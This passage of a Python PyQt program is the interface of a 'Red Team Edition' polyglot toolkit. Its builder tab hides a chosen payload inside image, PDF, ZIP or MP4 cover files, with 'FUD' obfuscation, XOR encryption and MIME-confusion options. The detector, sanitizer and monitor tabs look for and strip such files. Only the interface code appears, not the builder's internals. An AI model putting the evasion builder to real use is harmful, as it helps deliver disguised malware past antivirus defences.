        grid.addWidget(QLabel("Attack Vector:"), 0, 2)
        self.bld_vector = styled_combo([
            'Standard Polyglot (trailing data)',
            'FUD Cryptor (multi-layer obfuscation)',
            'MIME-Type Confusion',
            'Covert Archive Embedding',
        ])
        grid.addWidget(self.bld_vector, 0, 3)

        self.bld_encrypt = QCheckBox("XOR Encrypt Payload")
        self.bld_mime = QCheckBox("MIME Header Confusion")
        self.bld_fud = QCheckBox("FUD Obfuscation")

        hbox = QHBoxLayout()
        hbox.addWidget(self.bld_encrypt)
        hbox.addWidget(self.bld_mime)
        hbox.addWidget(self.bld_fud)
        hbox.addStretch()
        grid.addLayout(hbox, 1, 0, 1, 4)

        opts_layout.addLayout(grid)
        layout.addWidget(opts_card)

        # Build button
        btn_row = QHBoxLayout()
        build_btn = make_button("◆  BUILD POLYGLOT", Theme.FG_ACCENT)
        build_btn.setFixedHeight(48)
        build_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        build_btn.clicked.connect(self._run_builder)
        btn_row.addWidget(build_btn)
        btn_row.addStretch()
        layout.addLayout(btn_row)

        # Log
        log_card, log_layout = make_card("Build Log", "📋")
        self.bld_log = styled_log()
        log_layout.addWidget(self.bld_log)
        layout.addWidget(log_card, stretch=1)

        return page

    # ── Detector ─────────────────────────────────────────────

    def _build_detector(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(30, 25, 30, 25)
        layout.setSpacing(15)

        header = QLabel("⚠  Polyglot Detector")
        header.setStyleSheet(f"font-size: 24px; font-weight: bold; color: {Theme.FG_YELLOW};")
        layout.addWidget(header)

        # Input
        input_card, input_layout = make_card("Scan Target", "🔍")
        row = QHBoxLayout()
        self.det_path = styled_input("Select file or directory to scan...")
        row.addWidget(self.det_path, stretch=1)
        for text, cb in [("Browse File", lambda: self._browse_file(self.det_path)),
                          ("Browse Dir", lambda: self._browse_dir(self.det_path)),
                          ("⚠  SCAN", self._run_detector)]:
            btn = make_button(text, Theme.FG_ACCENT if "SCAN" in text else Theme.FG_DIM)
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.clicked.connect(cb)
            row.addWidget(btn)
        input_layout.addLayout(row)
        layout.addWidget(input_card)

        self.det_progress = QProgressBar()
        layout.addWidget(self.det_progress)

        log_card, log_layout = make_card("Detection Results", "📊")
        self.det_results = styled_log()
        log_layout.addWidget(self.det_results)
        layout.addWidget(log_card, stretch=1)

        return page

    # ── Sanitizer ────────────────────────────────────────────

    def _build_sanitizer(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(30, 25, 30, 25)
        layout.setSpacing(15)

        header = QLabel("🛡  Polyglot Sanitizer")
        header.setStyleSheet(f"font-size: 24px; font-weight: bold; color: {Theme.FG_GREEN};")
        layout.addWidget(header)

        input_card, input_layout = make_card("Sanitize Target", "🧹")
        row = QHBoxLayout()
        self.san_path = styled_input("Select file or directory to sanitize...")
        row.addWidget(self.san_path, stretch=1)
        for text, cb in [("Browse File", lambda: self._browse_file(self.san_path)),
                          ("Browse Dir", lambda: self._browse_dir(self.san_path))]:
            btn = make_button(text, Theme.FG_DIM)
            btn.clicked.connect(cb)
            row.addWidget(btn)
        self.san_backup = QCheckBox("Create .bak backup")
        self.san_backup.setChecked(True)
        row.addWidget(self.san_backup)
        san_btn = make_button("🛡  SANITIZE", Theme.FG_GREEN)
        san_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        san_btn.clicked.connect(self._run_sanitizer)
        row.addWidget(san_btn)
        input_layout.addLayout(row)
        layout.addWidget(input_card)

        log_card, log_layout = make_card("Sanitization Results", "📊")
        self.san_results = styled_log()
        log_layout.addWidget(self.san_results)
        layout.addWidget(log_card, stretch=1)

        return page

    # ── Monitor ──────────────────────────────────────────────

    def _build_monitor(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(30, 25, 30, 25)
        layout.setSpacing(15)

        header = QLabel("▶  Real-Time Monitor")
        header.setStyleSheet(f"font-size: 24px; font-weight: bold; color: {Theme.FG_CYAN};")
        layout.addWidget(header)

        # Controls
        ctrl_card, ctrl_layout = make_card("Watch Directory", "👁")
        row = QHBoxLayout()
        self.mon_dir = styled_input(str(Path.home() / "Downloads"))
        row.addWidget(self.mon_dir, stretch=1)
        btn = make_button("Browse", Theme.FG_DIM)
        btn.clicked.connect(lambda: self._browse_dir(self.mon_dir))
        row.addWidget(btn)
        self.mon_btn = make_button("▶  START MONITORING", Theme.FG_GREEN)
        self.mon_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.mon_btn.clicked.connect(self._toggle_monitor)
        row.addWidget(self.mon_btn)
        ctrl_layout.addLayout(row)
        layout.addWidget(ctrl_card)

        # Stats
        stats_row = QHBoxLayout()
        stats_row.setSpacing(15)
        self.mon_scanned = make_stat_card("🔍", "0", "Scanned", Theme.FG_BLUE)
        self.mon_threats = make_stat_card("⚠", "0", "Threats", Theme.FG_ACCENT)
        self.mon_clean = make_stat_card("✓", "0", "Clean", Theme.FG_GREEN)
        for card in [self.mon_scanned, self.mon_threats, self.mon_clean]:
            stats_row.addWidget(card)
        layout.addLayout(stats_row)

        # Live feed
        feed_card, feed_layout = make_card("Live Alert Feed", "🔔")
        self.mon_feed = styled_log()
        feed_layout.addWidget(self.mon_feed)
        layout.addWidget(feed_card, stretch=1)

        return page

    # ── Log ──────────────────────────────────────────────────

    def _build_log(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(30, 25, 30, 25)
        layout.setSpacing(15)

        header = QLabel("📋  Activity Log")
        header.setStyleSheet(f"font-size: 24px; font-weight: bold; color: {Theme.FG_TEXT};")
        layout.addWidget(header)

        btn_row = QHBoxLayout()
        for text, cb in [("Clear", self._clear_log), ("Export", self._export_log)]:
            btn = make_button(text, Theme.FG_DIM)
            btn.clicked.connect(cb)
            btn_row.addWidget(btn)
        btn_row.addStretch()
        layout.addLayout(btn_row)

        self.main_log = styled_log()
        layout.addWidget(self.main_log, stretch=1)

        self._log_main("Polyglot Toolkit v2.0 — Red Team Edition initialized", "header")
        self._log_main(f"Platform: {platform.system()} {platform.release()}", "info")
        self._log_main("Attack vectors: Standard | FUD Cryptor | MIME Confusion | Covert Embedding", "info")
        return page

    # ── Helpers ──────────────────────────────────────────────

    def _browse_file(self, entry):
        path, _ = QFileDialog.getOpenFileName(self, "Select File")
        if path:
            entry.setText(path)

    def _browse_dir(self, entry):
        path = QFileDialog.getExistingDirectory(self, "Select Directory")
        if path:
            entry.setText(path)

    def _log_widget(self, widget, text, tag=None):
        colors = {
            'critical': Theme.FG_ACCENT, 'high': Theme.FG_ORANGE,
            'warning': Theme.FG_YELLOW, 'info': Theme.FG_BLUE,
            'success': Theme.FG_GREEN, 'header': Theme.FG_ACCENT,
            'clean': Theme.FG_CYAN,
        }
        color = colors.get(tag, Theme.FG_TEXT)
        weight = "bold" if tag in ('critical', 'header', 'high') else "normal"
        widget.append(f'<span style="color:{color};font-weight:{weight}">{text}</span>')

    def _log_main(self, text, tag=None):
        ts = datetime.now().strftime('%H:%M:%S')
        self._log_widget(self.main_log, f"[{ts}] {text}", tag)

    def _update_stat(self, card, value):
        card.val_label.setText(str(value))

    # ── Builder Action ───────────────────────────────────────

    def _run_builder(self):
        cover = self.bld_cover.text().strip()
        payload = self.bld_payload.text().strip()
        if not cover or not os.path.isfile(cover):
            QMessageBox.warning(self, "Error", "Select a valid cover file")
            return
        if not payload or not os.path.isfile(payload):
            QMessageBox.warning(self, "Error", "Select a valid payload file")
            return

        ext_map = {'JPEG': '.jpg', 'PNG': '.png', 'GIF': '.gif', 'PDF': '.pdf', 'ZIP': '.zip', 'MP4': '.mp4'}
        container = self.bld_type.currentText()
        default_ext = ext_map.get(container, '.bin')

        output, _ = QFileDialog.getSaveFileName(self, "Save Polyglot As", f"polyglot{default_ext}",
                                                 f"{container} Files (*{default_ext});;All Files (*)")
        if not output:
            return

        self._log_widget(self.bld_log, "═" * 60, "header")
        self._log_widget(self.bld_log, f"Building {container} polyglot...", "info")

        try:
            vector = self.bld_vector.currentText()
            stats = self.builder.build(
                cover, payload, output,
                container_type=container.lower(),
                encrypt=self.bld_encrypt.isChecked(),
                fud=self.bld_fud.isChecked(),
                mime_confuse=self.bld_mime.isChecked(),
            )

            self._log_widget(self.bld_log, f"✓  Output:     {stats['output']}", "success")
            self._log_widget(self.bld_log, f"   Vector:     {vector}")
            self._log_widget(self.bld_log, f"   Container:  {stats['container_type']}")
            self._log_widget(self.bld_log, f"   Cover:      {stats['cover_size']:,} bytes")
            self._log_widget(self.bld_log, f"   Payload:    {stats['payload_size']:,} bytes")
            self._log_widget(self.bld_log, f"   Output:     {stats['output_size']:,} bytes")
            self._log_widget(self.bld_log, f"   Offset:     0x{stats['payload_offset']:X}")
            self._log_widget(self.bld_log, f"   Entropy:    {stats['entropy']}")
            self._log_widget(self.bld_log, f"   Encrypted:  {stats['encrypted']}")
            self._log_widget(self.bld_log, f"   FUD:        {stats['fud_protected']}")
            self._log_widget(self.bld_log, f"   MIME Conf:  {stats['mime_confused']}")
            self._log_widget(self.bld_log, "═" * 60, "header")

            self._log_main(f"Polyglot built: {output}", "success")
            self.counts['built'] += 1
            self._update_stat(self.stat_built, self.counts['built'])
            Notifier.send("Polyglot Built", f"{container} polyglot created successfully")

        except Exception as e:
            self._log_widget(self.bld_log, f"✗  ERROR: {e}", "critical")
            self._log_main(f"Build failed: {e}", "critical")

    # ── Detector Action ──────────────────────────────────────

    def _run_detector(self):
        target = self.det_path.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Select a file or directory")
            return

        self._log_main(f"Scanning: {target}", "info")

        if os.path.isfile(target):
            files = [target]
        elif os.path.isdir(target):
            exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf', '.doc', '.docx',
                    '.zip', '.exe', '.dll', '.bat', '.cmd', '.ps1', '.vbs', '.js', '.mp4'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))
        else:
            return

        self.det_progress.setMaximum(len(files))
        self.det_progress.setValue(0)
        threats = 0

        for i, fpath in enumerate(files):
            findings = self.detector.scan_file(fpath)
            fname = os.path.basename(fpath)
            self.counts['scanned'] += 1

            if findings:
                crit = [f for f in findings if f['severity'] in ('critical', 'high')]
                if crit:
                    threats += len(crit)
                    self.counts['threats'] += len(crit)
                    self._log_widget(self.det_results, f"\n⚠  {fname}", "header")
                    for f in findings:
                        off = f" @ 0x{f['offset']:X}" if f.get('offset') else ""
                        self._log_widget(self.det_results, f"  [{f['severity'].upper()}] {f['type']}: {f['detail']}{off}", f['severity'])
                else:
                    self._log_widget(self.det_results, f"○  {fname} — minor warnings", "warning")
            else:
                self._log_widget(self.det_results, f"✓  {fname} — CLEAN", "clean")

            self.det_progress.setValue(i + 1)
            self._update_stat(self.stat_scanned, self.counts['scanned'])
            self._update_stat(self.stat_threats, self.counts['threats'])

        self._log_widget(self.det_results, f"\n{'═' * 60}", "header")
        self._log_widget(self.det_results, f"SCAN COMPLETE: {len(files)} files, {threats} threats", "header")

        if threats > 0:
            self._log_main(f"Threats detected: {threats} in {len(files)} files", "critical")
            Notifier.send("THREATS DETECTED", f"{threats} threats found in {len(files)} files", "critical")
        else:
            self._log_main(f"All {len(files)} files clean", "success")

    # ── Sanitizer Action ─────────────────────────────────────

    def _run_sanitizer(self):
        target = self.san_path.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Select a file or directory")
            return

        self._log_main(f"Sanitizing: {target}", "info")

        if os.path.isfile(target):
            files = [target]
        elif os.path.isdir(target):
            exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf', '.zip', '.mp4'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))
        else:
            return

        sanitized = 0
        total_removed = 0

        for fpath in files:
            try:
                result = self.sanitizer.sanitize(fpath, self.san_backup.isChecked())
                fname = os.path.basename(fpath)
                if result['status'] == 'sanitized':
                    sanitized += 1
                    total_removed += result['removed_bytes']
                    msg = f"✓  {fname}: {result['detail']}"
                    if result.get('backup'):
                        msg += f" → backup saved"
                    self._log_widget(self.san_results, msg, "success")
                    self.counts['sanitized'] += 1
                elif result['status'] == 'clean':
                    self._log_widget(self.san_results, f"○  {fname}: already clean", "clean")
                else:
                    self._log_widget(self.san_results, f"⊘  {fname}: {result['detail']}", "warning")
            except Exception as e:
                self._log_widget(self.san_results, f"✗  {os.path.basename(fpath)}: {e}", "critical")

        self._log_widget(self.san_results, f"\n{'═' * 60}", "header")
        self._log_widget(self.san_results, f"DONE: {sanitized}/{len(files)} sanitized, {total_removed:,} bytes removed", "header")
        self._update_stat(self.stat_sanitized, self.counts['sanitized'])

        if sanitized > 0:
            Notifier.send("Sanitization Complete", f"{sanitized} files cleaned, {total_removed:,} bytes removed")

    # ── Monitor Action ───────────────────────────────────────

    def _toggle_monitor(self):
        if self.monitor_thread.running:
            self.monitor_thread.stop_monitoring()
            self.mon_btn.setText("▶  START MONITORING")
            self.mon_btn.setStyleSheet(f"background: {Theme.FG_GREEN}; color: white; border: none; border-radius: 6px; padding: 10px 24px; font-weight: bold;")
            self._log_main("Monitor stopped", "warning")
        else:
            directory = self.mon_dir.text().strip()
            if not os.path.isdir(directory):
                QMessageBox.warning(self, "Error", "Select a valid directory")
                return
            self.mon_btn.setText("■  STOP MONITORING")
            self.mon_btn.setStyleSheet(f"background: {Theme.FG_ACCENT}; color: white; border: none; border-radius: 6px; padding: 10px 24px; font-weight: bold;")
            self._log_main(f"Monitoring: {directory}", "success")
            self.monitor_thread.start_monitoring(directory)

    def _on_monitor_alert(self, alert):
        ts = alert['time']
        sev = alert['severity'].upper()
        self._log_widget(self.mon_feed, f"[{ts}] [{sev}] {alert['file']}", alert['severity'])
        self._log_widget(self.mon_feed, f"  → {alert['detail']}", "info")
        self.counts['threats'] += 1
        self._update_stat(self.stat_threats, self.counts['threats'])

    def _on_monitor_stats(self, stats):
        self._update_stat(self.mon_scanned, stats['scanned'])
        self._update_stat(self.mon_threats, stats['threats'])
        self._update_stat(self.mon_clean, stats['clean'])
        self._update_stat(self.stat_scanned, stats['scanned'])

    # ── Quick Actions ────────────────────────────────────────

    def _quick_scan(self):
        path, _ = QFileDialog.getOpenFileName(self, "Quick Scan")
        if path:
            self.det_path.setText(path)
            self._switch_tab(2, self.nav_buttons[2])
            self._run_detector()

    def _quick_sanitize(self):
        path, _ = QFileDialog.getOpenFileName(self, "Quick Sanitize")
        if path:
            self.san_path.setText(path)
            self._switch_tab(3, self.nav_buttons[3])
            self._run_sanitizer()

    # ── Log Actions ──────────────────────────────────────────

    def _clear_log(self):
        self.main_log.clear()

    def _export_log(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export Log", "polyglot_log.txt", "Text Files (*.txt)")
        if path:
            with open(path, 'w') as f:
                f.write(self.main_log.toPlainText())
            Notifier.send("Log Exported", f"Saved to {os.path.basename(path)}")


# ── Entry Point ──────────────────────────────────────────────

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    # Dark palette as fallback
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(Theme.BG_DARK))
    palette.setColor(QPalette.ColorRole.WindowText, QColor(Theme.FG_TEXT))
    palette.setColor(QPalette.ColorRole.Base, QColor(Theme.BG_INPUT))
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor(Theme.BG_PANEL))
    palette.setColor(QPalette.ColorRole.Text, QColor(Theme.FG_TEXT))
    palette.setColor(QPalette.ColorRole.Button, QColor(Theme.BG_CARD))
    palette.setColor(QPalette.ColorRole.ButtonText, QColor(Theme.FG_TEXT))
    palette.setColor(QPalette.ColorRole.Highlight, QColor(Theme.FG_ACCENT))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor("#ffffff"))
    app.setPalette(palette)

    window = PolyglotApp()
    window.show()
    sys.exit(app.exec())


if __name__ == '__main__':
    main()
